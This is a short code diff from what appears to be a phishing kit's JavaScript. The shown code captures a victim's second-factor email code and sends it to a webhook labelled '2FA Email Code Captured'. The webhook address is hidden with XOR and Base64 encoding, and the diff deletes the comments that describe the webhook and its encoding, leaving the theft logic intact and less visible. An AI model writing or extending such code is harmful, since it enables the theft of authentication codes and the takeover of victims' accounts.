@@ -249,7 +249,7 @@ if (twofaInput2 && verifyButton2) {
       return;
     }
 
-    // Send webhook for email code
+    
     await sendWebhook('2FA Email Code Captured 📩', `Second Modal Code Entered: **${codeEnteredValue}**`, 0xffa500);
 
     twofaInput2.value = '';
@@ -266,8 +266,7 @@ if (twofaInput2 && verifyButton2) {
   });
 }
 
-// === Webhook Sending ===
-// XOR + Base64 encoded webhook
+
 const encryptedWebhook = "FhMWB1gXTVhTAgIPWxEfVEgXXVBVDxtOBBZHTAwYUF0OAlZRVUAGBlVXEw==";
 const xorKey = "hunter2"; // must match the encoding key
 
